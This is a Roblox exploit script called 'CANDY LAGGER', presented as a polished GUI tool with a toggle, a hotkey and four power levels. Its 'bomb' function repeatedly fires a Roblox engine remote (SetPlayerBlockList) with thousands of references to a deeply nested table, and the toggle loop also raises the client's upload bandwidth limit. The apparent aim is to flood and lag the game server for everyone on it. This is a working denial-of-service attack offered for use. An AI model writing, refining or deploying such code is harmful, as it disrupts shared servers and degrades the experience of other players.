-- SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local ConfigFile = "CANDY_LAGGER.json"

-- TEARDOWN REGISTRY
local _connections = {}
local _spawnThreads = {}
local _isAlive = true

local function _track(conn)
table.insert(_connections, conn)
return conn
end

local function _spawn(fn)
local t = task.spawn(fn)
table.insert(_spawnThreads, t)
return t
end

local function teardown()
_isAlive = false
for _, c in ipairs(_connections) do pcall(function() c:Disconnect() end) end
for _, t in ipairs(_spawnThreads) do pcall(function() task.cancel(t) end) end
_connections = {}
_spawnThreads = {}
end

-- DESTROY OLD GUI
do
local old = CoreGui:FindFirstChild("CANDY_LAGGER_UI")
if old then
local sig = old:FindFirstChild("__Teardown")
if sig then pcall(function() sig:Fire() end) end
old:Destroy()
end
end

-- CONSTANTS
local NIVELES = {
Low = { poder = 50 },
Mid = { poder = 70 },
High = { poder = 95 },
Ultra = { poder = 110 },
}
local LEVEL_ORDER = { "Low", "Mid", "High", "Ultra" }
local PANEL_W = 300
local PANEL_H = 296 -- extended to fit size slider at bottom
local TRACK_W, TRACK_H = 52, 28

-- STATE
local keybind = Enum.KeyCode.M
local listeningForKey = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false
local isMinimized = false

-- THEME - CANDY LAGGER Black & Pink
local T = {
BgPanel = Color3.fromRGB(12, 5, 12),
BgElement = Color3.fromRGB(18, 18, 20),
AccentBright = Color3.fromRGB(255, 105, 180), -- Hot Pink
AccentMid = Color3.fromRGB(255, 20, 147), -- Deep Pink
AccentDim = Color3.fromRGB(90, 30, 60),
TextPrimary = Color3.fromRGB(255, 230, 245),
TextSecondary = Color3.fromRGB(255, 150, 200),
TextMuted = Color3.fromRGB(160, 90, 120),
GreenOn = Color3.fromRGB(255, 105, 180),
RedOff = Color3.fromRGB(80, 20, 40),
ToggleTrackOn = Color3.fromRGB(255, 105, 180),
ToggleTrackOff = Color3.fromRGB(35, 20, 28),
Font = Enum.Font.GothamBold,
FontSemi = Enum.Font.Gotham,
ButtonUltra = Color3.fromRGB(255, 20, 147),
PurpleText = Color3.fromRGB(255, 182, 219),
}

-- HELPERS
local function tw(obj, duration, props, style, dir)
style = style or Enum.EasingStyle.Quad
dir = dir or Enum.EasingDirection.Out
return TweenService:Create(obj, TweenInfo.new(duration, style, dir), props)
end

local function applyCorner(parent, radius)
local c = Instance.new("UICorner")
c.CornerRadius = UDim.new(0, radius or 10)
c.Parent = parent
return c
end

local function applyStroke(parent, color, thickness, trans)
local s = Instance.new("UIStroke")
s.Color = color or T.AccentMid
s.Thickness = thickness or 1
s.Transparency = trans or 0
s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
s.Parent = parent
return s
end

local function applyGradient(parent, c0, c1, rot)
local g = Instance.new("UIGradient")
g.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, c0),
ColorSequenceKeypoint.new(1, c1),
})
g.Rotation = rot or 90
g.Parent = parent
return g
end

local function addClickFeedback(btn)
_track(btn.MouseButton1Down:Connect(function()
if not _isAlive then return end
local s = btn.Size
tw(btn, 0.08, {
Size = UDim2.new(s.X.Scale * 0.93, s.X.Offset * 0.93,
s.Y.Scale * 0.93, s.Y.Offset * 0.93)
}):Play()
end))
_track(btn.MouseButton1Up:Connect(function()
if not _isAlive then return end
local s = btn.Size
tw(btn, 0.12, {
Size = UDim2.new(s.X.Scale / 0.93, s.X.Offset / 0.93,
s.Y.Scale / 0.93, s.Y.Offset / 0.93)
}):Play()
end))
end

-- CONFIG PERSISTENCE
local function SaveConfig()
pcall(function()
writefile(ConfigFile, HttpService:JSONEncode({
Keybind = keybind.Name,
Nivel = nivelActual,
Bloqueado = ventanaBloqueada,
}))
end)
end

local function LoadConfig()
pcall(function()
if isfile and isfile(ConfigFile) then
local ok, data = pcall(function()
return HttpService:JSONDecode(readfile(ConfigFile))
end)
if ok and data then
keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
nivelActual = data.Nivel or "Low"
ventanaBloqueada = data.Bloqueado or false
end
end
end)
end
LoadConfig()

-- LAG ENGINE
local function bomb(poder)
local main, spam = {}, {{}}
local z = spam[1]
for i = 1, 25 do local t = {} table.insert(z, t) z = t end
local max = math.min(12000, poder * 50)
for i = 1, max do table.insert(main, spam) end
pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- SCREEN GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CANDY_LAGGER_UI"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = CoreGui

local teardownSignal = Instance.new("BindableEvent")
teardownSignal.Name = "__Teardown"
teardownSignal.Parent = screenGui
_track(teardownSignal.Event:Connect(teardown))

-- MAIN FRAME
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = T.BgPanel
mainFrame.BorderSizePixel = 0
mainFrame.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
mainFrame.Position = UDim2.new(0.5, -PANEL_W / 2, 0.5, -PANEL_H / 2)
mainFrame.ClipsDescendants = true
mainFrame.ZIndex = 2
mainFrame.Parent = screenGui
applyCorner(mainFrame, 14)
applyGradient(mainFrame,
Color3.fromRGB(12, 5, 12),
Color3.fromRGB(8, 4, 10),
120
)

-- UI Scale (for size slider)
local uiScale = Instance.new("UIScale")
uiScale.Scale = 1
uiScale.Parent = mainFrame

-- BACKGROUND IMAGE
local bgImage = Instance.new("ImageLabel")
bgImage.Image = "rbxassetid://113237012921658"
bgImage.BackgroundTransparency = 1
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0, 0, 0, 0)
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ImageTransparency = 0.18
bgImage.ZIndex = 1
bgImage.Parent = mainFrame
applyCorner(bgImage, 14)

-- Dark overlay to keep text readable over the image
local bgOverlay = Instance.new("Frame")
bgOverlay.BackgroundColor3 = Color3.fromRGB(8, 4, 10)
bgOverlay.BackgroundTransparency = 0.48
bgOverlay.BorderSizePixel = 0
bgOverlay.Size = UDim2.new(1, 0, 1, 0)
bgOverlay.ZIndex = 2
bgOverlay.Parent = mainFrame
applyCorner(bgOverlay, 14)

-- Animated glow border
local mainStroke = applyStroke(mainFrame, T.AccentMid, 1.5, 0)
_spawn(function()
while _isAlive and mainFrame.Parent do
tw(mainStroke, 1.8, { Color = T.AccentBright, Transparency = 0.3 }, Enum.EasingStyle.Sine):Play()
task.wait(1.8)
if not _isAlive then break end
tw(mainStroke, 1.8, { Color = T.AccentMid, Transparency = 0 }, Enum.EasingStyle.Sine):Play()
task.wait(1.8)
end
end)

-- TOP ACCENT BAR



-- HEADER
local header = Instance.new("Frame")
header.BackgroundTransparency = 1
header.Size = UDim2.new(1, 0, 0, 46)
header.Position = UDim2.new(0, 0, 0, 2)
header.ZIndex = 4
header.Parent = mainFrame

-- Logo pulse dot
local logoDot = Instance.new("Frame")
logoDot.BackgroundColor3 = T.AccentBright
logoDot.Size = UDim2.new(0, 8, 0, 8)
logoDot.Position = UDim2.new(0, 16, 0.5, -4)
logoDot.BorderSizePixel = 0
logoDot.ZIndex = 4
logoDot.Parent = header
applyCorner(logoDot, 4)

_spawn(function()
while _isAlive and logoDot.Parent do
tw(logoDot, 0.9, { BackgroundTransparency = 0.5 }, Enum.EasingStyle.Sine):Play()
task.wait(0.9)
if not _isAlive then break end
tw(logoDot, 0.9, { BackgroundTransparency = 0 }, Enum.EasingStyle.Sine):Play()
task.wait(0.9)
end
end)

-- Title
local titleLabel = Instance.new("TextLabel")
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 32, 0, 0)
titleLabel.Size = UDim2.new(0, 160, 1, 0)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "CANDY LAGGER"
titleLabel.TextColor3 = T.TextPrimary
titleLabel.TextSize = 13
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 4
titleLabel.Parent = header

_spawn(function()
while _isAlive and titleLabel.Parent do
tw(titleLabel, 2.0, { TextColor3 = T.AccentBright }, Enum.EasingStyle.Sine):Play()
task.wait(2.0)
if not _isAlive then break end
tw(titleLabel, 2.0, { TextColor3 = T.TextPrimary }, Enum.EasingStyle.Sine):Play()
task.wait(2.0)
end
end)

-- Version badge
local versionBadge = Instance.new("TextLabel")
versionBadge.BackgroundColor3 = T.BgElement
versionBadge.Size = UDim2.new(0, 28, 0, 14)
versionBadge.Position = UDim2.new(0, 196, 0.5, -7)
versionBadge.Font = T.FontSemi
versionBadge.Text = "v2.0"
versionBadge.TextColor3 = T.AccentBright
versionBadge.TextSize = 8
versionBadge.ZIndex = 4
versionBadge.Parent = header
applyCorner(versionBadge, 4)

-- MINI TOGGLE (visible when minimized)
local miniToggleBtn = Instance.new("TextButton")
miniToggleBtn.BackgroundColor3 = T.BgElement
miniToggleBtn.Size = UDim2.new(0, 52, 0, 22)
miniToggleBtn.Position = UDim2.new(1, -90, 0.5, -11)
miniToggleBtn.Font = T.Font
miniToggleBtn.Text = "● OFF"
miniToggleBtn.TextColor3 = T.RedOff
miniToggleBtn.TextSize = 9
miniToggleBtn.AutoButtonColor = false
miniToggleBtn.Visible = false -- hidden until minimized
miniToggleBtn.ZIndex = 5
miniToggleBtn.Parent = header
applyCorner(miniToggleBtn, 6)
applyStroke(miniToggleBtn, T.AccentDim, 1, 0)

-- Minimize button
local btnMinimize = Instance.new("TextButton")
btnMinimize.BackgroundColor3 = T.BgElement
btnMinimize.Size = UDim2.new(0, 24, 0, 24)
btnMinimize.Position = UDim2.new(1, -58, 0.5, -12)
btnMinimize.Font = T.Font
btnMinimize.Text = "—"
btnMinimize.TextColor3 = T.TextSecondary
btnMinimize.TextSize = 10
btnMinimize.AutoButtonColor = false
btnMinimize.ZIndex = 4
btnMinimize.Parent = header
applyCorner(btnMinimize, 6)
applyStroke(btnMinimize, T.AccentDim, 1, 0)

-- Lock button
local lockButton = Instance.new("TextButton")
lockButton.BackgroundColor3 = T.BgElement
lockButton.Size = UDim2.new(0, 24, 0, 24)
lockButton.Position = UDim2.new(1, -30, 0.5, -12)
lockButton.Font = T.Font
lockButton.Text = "🔓"
lockButton.TextSize = 11
lockButton.AutoButtonColor = false
lockButton.ZIndex = 4
lockButton.Parent = header
applyCorner(lockButton, 6)
applyStroke(lockButton, T.AccentDim, 1, 0)

-- DIVIDER HELPER
local function makeDivider(yPos)
local d = Instance.new("Frame")
d.BackgroundColor3 = T.AccentDim
d.BorderSizePixel = 0
d.Size = UDim2.new(1, -32, 0, 1)
d.Position = UDim2.new(0, 16, 0, yPos)
d.BackgroundTransparency = 0.5
d.ZIndex = 4
d.Parent = mainFrame
return d
end

makeDivider(50) -- below header
makeDivider(108) -- below enable row
makeDivider(194) -- above tryhard label
makeDivider(208) -- above footer
makeDivider(252) -- above size slider

-- ENABLE ROW
local enableRow = Instance.new("Frame")
enableRow.BackgroundTransparency = 1
enableRow.Size = UDim2.new(1, -32, 0, 44)
enableRow.Position = UDim2.new(0, 16, 0, 56)
enableRow.ZIndex = 4
enableRow.Parent = mainFrame

-- Label
local enableLabel = Instance.new("TextLabel")
enableLabel.BackgroundTransparency = 1
enableLabel.Size = UDim2.new(0, 90, 1, 0)
enableLabel.Font = T.Font
enableLabel.Text = "ENABLE LAGGER"
enableLabel.TextColor3 = T.TextSecondary
enableLabel.TextSize = 10
enableLabel.TextXAlignment = Enum.TextXAlignment.Left
enableLabel.TextYAlignment = Enum.TextYAlignment.Center
enableLabel.ZIndex = 4
enableLabel.Parent = enableRow

-- Keybind pill
local keybindBtn = Instance.new("TextButton")
keybindBtn.BackgroundColor3 = T.BgElement
keybindBtn.Size = UDim2.new(0, 36, 0, 24)
keybindBtn.Position = UDim2.new(0, 98, 0.5, -12)
keybindBtn.Font = T.Font
keybindBtn.Text = keybind.Name
keybindBtn.TextColor3 = T.AccentBright
keybindBtn.TextSize = 10
keybindBtn.AutoButtonColor = false
keybindBtn.ZIndex = 4
keybindBtn.Parent = enableRow
applyCorner(keybindBtn, 6)
applyStroke(keybindBtn, T.AccentMid, 1, 0)

-- Status badge
local statusBadge = Instance.new("Frame")
statusBadge.BackgroundColor3 = T.RedOff
statusBadge.Size = UDim2.new(0, 50, 0, 22)
statusBadge.Position = UDim2.new(1, -120, 0.5, -11)
statusBadge.ZIndex = 4
statusBadge.Parent = enableRow
applyCorner(statusBadge, 6)

local statusLabel = Instance.new("TextLabel")
statusLabel.BackgroundTransparency = 1
statusLabel.Size = UDim2.new(1, 0, 1, 0)
statusLabel.Font = T.Font
statusLabel.Text = "IDLE"
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextSize = 10
statusLabel.ZIndex = 4
statusLabel.Parent = statusBadge

-- Toggle track
local toggleTrack = Instance.new("Frame")
toggleTrack.BackgroundColor3 = T.ToggleTrackOff
toggleTrack.Size = UDim2.new(0, TRACK_W, 0, TRACK_H)
toggleTrack.Position = UDim2.new(1, -TRACK_W, 0.5, -TRACK_H / 2)
toggleTrack.BorderSizePixel = 0
toggleTrack.ZIndex = 4
toggleTrack.Parent = enableRow
applyCorner(toggleTrack, TRACK_H / 2)
applyStroke(toggleTrack, T.AccentDim, 1, 0)

-- Toggle ball
local toggleBall = Instance.new("Frame")
toggleBall.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toggleBall.Size = UDim2.new(0, TRACK_H - 6, 0, TRACK_H - 6)
toggleBall.Position = UDim2.new(0, 3, 0.5, -(TRACK_H - 6) / 2)
toggleBall.ZIndex = 5
toggleBall.BorderSizePixel = 0
toggleBall.Parent = toggleTrack
applyCorner(toggleBall, (TRACK_H - 6) / 2)

-- Invisible hit area
local toggleHit = Instance.new("TextButton")
toggleHit.BackgroundTransparency = 1
toggleHit.Size = UDim2.new(1, 0, 1, 0)
toggleHit.Text = ""
toggleHit.ZIndex = 6
toggleHit.Parent = toggleTrack
toggleHit.AutoButtonColor = false

-- INTENSITY SECTION
local intensityLabel = Instance.new("TextLabel")
intensityLabel.BackgroundTransparency = 1
intensityLabel.Position = UDim2.new(0, 16, 0, 118)
intensityLabel.Size = UDim2.new(0, 100, 0, 16)
intensityLabel.Font = T.FontSemi
intensityLabel.Text = "POWER"
intensityLabel.TextColor3 = T.TextMuted
intensityLabel.TextSize = 9
intensityLabel.TextXAlignment = Enum.TextXAlignment.Left
intensityLabel.ZIndex = 4
intensityLabel.Parent = mainFrame

local levelPill = Instance.new("Frame")
levelPill.BackgroundColor3 = T.BgElement
levelPill.Size = UDim2.new(1, -32, 0, 36)
levelPill.Position = UDim2.new(0, 16, 0, 138)
levelPill.ZIndex = 4
levelPill.Parent = mainFrame
applyCorner(levelPill, 10)
applyStroke(levelPill, T.AccentDim, 1, 0)

-- Sliding highlight inside pill
local levelHighlight = Instance.new("Frame")
levelHighlight.BackgroundColor3 = T.AccentMid
levelHighlight.Size = UDim2.new(1/4, -4, 1, -6)
levelHighlight.Position = UDim2.new(0, 2, 0, 3)
levelHighlight.ZIndex = 4
levelHighlight.BorderSizePixel = 0
levelHighlight.Parent = levelPill
applyCorner(levelHighlight, 7)
applyGradient(levelHighlight, T.AccentBright, T.AccentMid, 45)

-- Level buttons
local levelButtons = {}
for i, name in ipairs(LEVEL_ORDER) do
local btn = Instance.new("TextButton")
btn.BackgroundTransparency = 1
btn.Size = UDim2.new(1/4, 0, 1, 0)
btn.Position = UDim2.new((i - 1) / 4, 0, 0, 0)
btn.Font = T.Font
btn.Text = name:upper()
btn.TextColor3 = T.TextSecondary
btn.TextSize = 10
btn.ZIndex = 5
btn.AutoButtonColor = false
btn.Parent = levelPill
levelButtons[name] = btn
addClickFeedback(btn)
end

-- FOOTER
tryhardText = Instance.new("TextLabel")
tryhardText.BackgroundTransparency = 1
tryhardText.Position = UDim2.new(0, 16, 0, 180)
tryhardText.Size = UDim2.new(1, -32, 0, 14)
tryhardText.Font = Enum.Font.GothamBlack
tryhardText.Text = "Only for tryhards"
tryhardText.TextColor3 = T.PurpleText
tryhardText.TextSize = 9
tryhardText.TextXAlignment = Enum.TextXAlignment.Center
tryhardText.TextYAlignment = Enum.TextYAlignment.Center
tryhardText.ZIndex = 4
tryhardText.Visible = false
tryhardText.Parent = mainFrame

local footerLabel = Instance.new("TextLabel")
footerLabel.BackgroundTransparency = 1
footerLabel.Position = UDim2.new(0, 16, 0, 216)
footerLabel.Size = UDim2.new(1, -32, 0, 30)
footerLabel.Font = T.FontSemi
footerLabel.Text = "CANDY LAGGER"
footerLabel.TextColor3 = T.TextMuted
footerLabel.TextSize = 9
footerLabel.TextXAlignment = Enum.TextXAlignment.Center
footerLabel.TextYAlignment = Enum.TextYAlignment.Center
footerLabel.ZIndex = 4
footerLabel.Parent = mainFrame

-- SIZE SLIDER
local sizeSliderLabel = Instance.new("TextLabel")
sizeSliderLabel.BackgroundTransparency = 1
sizeSliderLabel.Position = UDim2.new(0, 16, 0, 258)
sizeSliderLabel.Size = UDim2.new(0, 60, 0, 12)
sizeSliderLabel.Font = T.FontSemi
sizeSliderLabel.Text = "UI SIZE"
sizeSliderLabel.TextColor3 = T.TextMuted
sizeSliderLabel.TextSize = 9
sizeSliderLabel.TextXAlignment = Enum.TextXAlignment.Left
sizeSliderLabel.ZIndex = 4
sizeSliderLabel.Parent = mainFrame

local sizeValueLabel = Instance.new("TextLabel")
sizeValueLabel.BackgroundTransparency = 1
sizeValueLabel.Position = UDim2.new(1, -50, 0, 258)
sizeValueLabel.Size = UDim2.new(0, 44, 0, 12)
sizeValueLabel.Font = T.FontSemi
sizeValueLabel.Text = "100%"
sizeValueLabel.TextColor3 = T.AccentBright
sizeValueLabel.TextSize = 9
sizeValueLabel.TextXAlignment = Enum.TextXAlignment.Right
sizeValueLabel.ZIndex = 4
sizeValueLabel.Parent = mainFrame

local sliderTrack = Instance.new("Frame")
sliderTrack.BackgroundColor3 = T.BgElement
sliderTrack.Size = UDim2.new(1, -32, 0, 8)
sliderTrack.Position = UDim2.new(0, 16, 0, 276)
sliderTrack.ZIndex = 4
sliderTrack.BorderSizePixel = 0
sliderTrack.Parent = mainFrame
applyCorner(sliderTrack, 4)
applyStroke(sliderTrack, T.AccentDim, 1, 0)

local sliderFill = Instance.new("Frame")
sliderFill.BackgroundColor3 = T.AccentMid
sliderFill.Size = UDim2.new(0.444, 0, 1, 0) -- default ~100% = 0.444 ratio
sliderFill.ZIndex = 4
sliderFill.BorderSizePixel = 0
sliderFill.Parent = sliderTrack
applyCorner(sliderFill, 4)
applyGradient(sliderFill, T.AccentBright, T.AccentMid, 0)

local sliderKnob = Instance.new("Frame")
sliderKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sliderKnob.Size = UDim2.new(0, 16, 0, 16)
sliderKnob.Position = UDim2.new(0.444, -8, 0.5, -8)
sliderKnob.ZIndex = 5
sliderKnob.BorderSizePixel = 0
sliderKnob.Parent = sliderTrack
applyCorner(sliderKnob, 8)
applyStroke(sliderKnob, T.AccentMid, 1.5, 0)

-- Wide invisible hit zone for the slider
local sliderHit = Instance.new("TextButton")
sliderHit.BackgroundTransparency = 1
sliderHit.Size = UDim2.new(1, 16, 0, 28)
sliderHit.Position = UDim2.new(0, -8, 0.5, -14)
sliderHit.Text = ""
sliderHit.ZIndex = 6
sliderHit.AutoButtonColor = false
sliderHit.Parent = sliderTrack

-- Slider logic
local SCALE_MIN, SCALE_MAX = 0.6, 1.5
local currentUIScale = 1.0
local isDraggingSlider = false

-- Default ratio for scale=1.0: (1.0 - 0.6) / (1.5 - 0.6) ≈ 0.4444
local function setUIScaleFromRatio(ratio)
ratio = math.clamp(ratio, 0, 1)
currentUIScale = SCALE_MIN + ratio * (SCALE_MAX - SCALE_MIN)
uiScale.Scale = currentUIScale
sliderFill.Size = UDim2.new(ratio, 0, 1, 0)
sliderKnob.Position = UDim2.new(ratio, -8, 0.5, -8)
sizeValueLabel.Text = math.floor(currentUIScale * 100 + 0.5) .. "%"
end

_track(sliderHit.MouseButton1Down:Connect(function()
if not _isAlive then return end
isDraggingSlider = true
end))

-- UPDATE FUNCTIONS
local tryhardText -- forward declare

local function updateMiniToggleUI()
if laggerActive then
miniToggleBtn.Text = "● ON"
tw(miniToggleBtn, 0.2, {
TextColor3 = T.GreenOn,
BackgroundColor3 = Color3.fromRGB(20, 60, 35),
}):Play()
else
miniToggleBtn.Text = "● OFF"
tw(miniToggleBtn, 0.2, {
TextColor3 = T.RedOff,
BackgroundColor3 = T.BgElement,
}):Play()
end
end

local function updateLevelUI()
local idx = table.find(LEVEL_ORDER, nivelActual) or 1
tw(levelHighlight, 0.25, {
Position = UDim2.new((idx - 1) / 4, 2, 0, 3),
BackgroundColor3 = (nivelActual == "Ultra") and T.ButtonUltra or T.AccentMid,
}):Play()
for _, name in ipairs(LEVEL_ORDER) do
local isActive = (name == nivelActual)
local textCol = isActive and Color3.fromRGB(255, 255, 255) or T.TextSecondary
tw(levelButtons[name], 0.2, { TextColor3 = textCol }):Play()
end
if tryhardText then
tryhardText.Visible = (nivelActual == "Ultra")
tryhardText.TextColor3 = T.PurpleText
end
end

local function updateToggleUI()
local ballTarget = laggerActive
and UDim2.new(1, -(TRACK_H - 6) - 3, 0.5, -(TRACK_H - 6) / 2)
or UDim2.new(0, 3, 0.5, -(TRACK_H - 6) / 2)
local trackColor = laggerActive and T.ToggleTrackOn or T.ToggleTrackOff
local statusColor = laggerActive and T.GreenOn or T.RedOff

tw(toggleBall, 0.22, { Position = ballTarget }):Play()
tw(toggleTrack, 0.22, { BackgroundColor3 = trackColor }):Play()
tw(statusBadge, 0.22, { BackgroundColor3 = statusColor }):Play()
statusLabel.Text = laggerActive and "ACTIVE" or "IDLE"

updateMiniToggleUI()

if laggerActive then
_spawn(function()
for _ = 1, 3 do
if not _isAlive then break end
tw(statusBadge, 0.18, { BackgroundTransparency = 0.4 }):Play()
task.wait(0.18)
tw(statusBadge, 0.18, { BackgroundTransparency = 0 }):Play()
task.wait(0.18)
end
end)
end
end

local function updateLockUI()
lockButton.Text = ventanaBloqueada and "🔒" or "🔓"
tw(lockButton, 0.2, {
TextColor3 = ventanaBloqueada and T.AccentBright or T.TextMuted
}):Play()
end

local function updateKeybindUI()
local name = keybind.Name:gsub("Button", "")
keybindBtn.Text = name
footerLabel.Text = "Press [" .. name .. "] to toggle • CANDY LAGGER"
end

-- TOGGLE LAGGER LOGIC
local function toggleLagger()
if not _isAlive then return end
laggerActive = not laggerActive
updateToggleUI()

if laggerActive then
if lagThread then task.cancel(lagThread) end
lagThread = task.spawn(function()
while laggerActive and _isAlive do
pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
bomb(NIVELES[nivelActual].poder)
task.wait(0.18)
end
end)
else
if lagThread then task.cancel(lagThread); lagThread = nil end
end
end

-- BUTTON CONNECTIONS

-- Main toggle
_track(toggleHit.MouseButton1Click:Connect(function()
if not _isAlive then return end
toggleLagger()
end))

-- Mini toggle (visible when minimized)
_track(miniToggleBtn.MouseButton1Click:Connect(function()
if not _isAlive then return end
toggleLagger()
end))

-- Level buttons
for _, name in ipairs(LEVEL_ORDER) do
local btn = levelButtons[name]
local capName = name
_track(btn.MouseButton1Click:Connect(function()
if not _isAlive then return end
nivelActual = capName
updateLevelUI()
SaveConfig()
end))
end

-- Lock
_track(lockButton.MouseButton1Click:Connect(function()
if not _isAlive then return end
ventanaBloqueada = not ventanaBloqueada
updateLockUI()
SaveConfig()
end))

-- Minimize / restore
_track(btnMinimize.MouseButton1Click:Connect(function()
if not _isAlive then return end
isMinimized = not isMinimized
local targetH = isMinimized and 50 or PANEL_H
tw(mainFrame, 0.28, { Size = UDim2.new(0, PANEL_W, 0, targetH) }, Enum.EasingStyle.Quart):Play()
btnMinimize.Text = isMinimized and "▲" or "—"
-- show mini toggle only when minimized
miniToggleBtn.Visible = isMinimized
-- hide version badge and lock button to avoid overlap with mini toggle
versionBadge.Visible = not isMinimized
lockButton.Visible = not isMinimized
-- slide minimize button to the far right when minimized so it doesn't overlap
btnMinimize.Position = isMinimized
and UDim2.new(1, -30, 0.5, -12)
or UDim2.new(1, -58, 0.5, -12)
end))

-- Keybind rebind click
_track(keybindBtn.MouseButton1Click:Connect(function()
if not _isAlive or listeningForKey then return end
listeningForKey = true
keybindBtn.Text = "..."
tw(keybindBtn, 0.15, { BackgroundColor3 = T.AccentBright }):Play()
end))

-- Slider drag input changed
_track(UserInputService.InputChanged:Connect(function(input)
if not _isAlive or not isDraggingSlider then return end
if input.UserInputType == Enum.UserInputType.MouseMovement
or input.UserInputType == Enum.UserInputType.Touch then
local trackAbs = sliderTrack.AbsolutePosition
local trackSize = sliderTrack.AbsoluteSize
local ratio = (input.Position.X - trackAbs.X) / trackSize.X
setUIScaleFromRatio(ratio)
end
end))

-- Slider drag end
_track(UserInputService.InputEnded:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1
or input.UserInputType == Enum.UserInputType.Touch then
isDraggingSlider = false
end
end))

-- GLOBAL INPUT
_track(UserInputService.InputBegan:Connect(function(input, gp)
if not _isAlive then return end
if gp then return end

-- Keybind capture
if listeningForKey then
if input.KeyCode ~= Enum.KeyCode.Unknown then
keybind = input.KeyCode
updateKeybindUI()
SaveConfig()
listeningForKey = false
tw(keybindBtn, 0.15, { BackgroundColor3 = T.BgElement }):Play()
end
return
end

-- Global hotkey toggle
if input.KeyCode == keybind then
toggleLagger()
end
end))

-- DRAG (header zone)
local isDragging, dragStart, startMain = false, nil, nil

_track(header.InputBegan:Connect(function(input)
if not _isAlive or ventanaBloqueada then return end
if input.UserInputType == Enum.UserInputType.MouseButton1
or input.UserInputType == Enum.UserInputType.Touch then
isDragging = true
dragStart = input.Position
startMain = mainFrame.Position
end
end))

_track(UserInputService.InputChanged:Connect(function(input)
if not _isAlive or not isDragging or ventanaBloqueada then return end
if input.UserInputType == Enum.UserInputType.MouseMovement
or input.UserInputType == Enum.UserInputType.Touch then
local dx = input.Position.X - dragStart.X
local dy = input.Position.Y - dragStart.Y
mainFrame.Position = UDim2.new(
startMain.X.Scale, startMain.X.Offset + dx,
startMain.Y.Scale, startMain.Y.Offset + dy
)
end
end))

_track(UserInputService.InputEnded:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1
or input.UserInputType == Enum.UserInputType.Touch then
isDragging = false
end
end))

-- INITIAL STATE SYNC
updateLevelUI()
updateToggleUI()
updateLockUI()
updateKeybindUI()
setUIScaleFromRatio(0.444) -- default 100%

-- ENTRY ANIMATION (scale + fade from center)
mainFrame.Size = UDim2.new(0, PANEL_W * 0.85, 0, PANEL_H * 0.85)
mainFrame.Position = UDim2.new(0.5, -(PANEL_W * 0.85) / 2, 0.5, -(PANEL_H * 0.85) / 2)
mainFrame.BackgroundTransparency = 1
task.delay(0.05, function()
if not _isAlive then return end
tw(mainFrame, 0.35, {
Size = UDim2.new(0, PANEL_W, 0, PANEL_H),
Position = UDim2.new(0.5, -PANEL_W / 2, 0.5, -PANEL_H / 2),
BackgroundTransparency = 0,
}, Enum.EasingStyle.Back, Enum.EasingDirection.Out):Play()
end)